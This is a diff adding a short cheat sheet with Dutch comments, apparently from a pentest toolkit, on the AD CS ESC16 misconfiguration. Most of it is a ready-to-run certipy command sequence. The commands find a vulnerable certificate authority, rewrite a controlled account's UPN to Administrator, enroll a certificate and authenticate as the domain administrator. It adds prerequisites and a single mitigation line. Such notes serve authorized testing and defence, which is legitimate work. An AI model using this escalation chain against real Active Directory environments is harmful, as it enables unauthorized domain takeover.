@@ -1,0 +1,29 @@
+# AD CS ESC16 — CA-level No Security Extension
+# CA configuratie schakelt security extension uit op CA-niveau
+# Vergelijkbaar met ESC9 maar CA-breed in plaats van per template
+#
+# === Vereisten ===
+# - CA met security extension uitgeschakeld (szOID_NTDS_CA_SECURITY_EXT)
+# - GenericWrite op een user of computer object
+# - Enrollment rechten
+#
+# === Voorbeelden ===
+
+# Check CA configuratie
+certipy find -u USER@DOMAIN -p 'PASS' -dc-ip DC_IP -vulnerable -stdout
+
+# Stap 1: Wijzig UPN van doelaccount naar Administrator
+certipy account update -u USER@DOMAIN -p 'PASS' -user TARGET_USER -upn Administrator@DOMAIN -dc-ip DC_IP
+
+# Stap 2: Certificaat aanvragen als TARGET_USER
+certipy req -u TARGET_USER@DOMAIN -p 'TARGET_PASS' -ca CA_NAME -target DC_FQDN -template User
+
+# Stap 3: UPN terugzetten
+certipy account update -u USER@DOMAIN -p 'PASS' -user TARGET_USER -upn TARGET_USER@DOMAIN -dc-ip DC_IP
+
+# Stap 4: Authenticeren met certificaat (mapped naar Administrator)
+certipy auth -pfx administrator.pfx -dc-ip DC_IP
+
+# Noot: Vergelijkbaar met ESC10 maar zonder StrongCertificateBindingEnforcement check
+# Noot: CA-brede instelling — alle templates zijn potentieel kwetsbaar
+# Noot: Mitigatie: Enable security extension op de CA
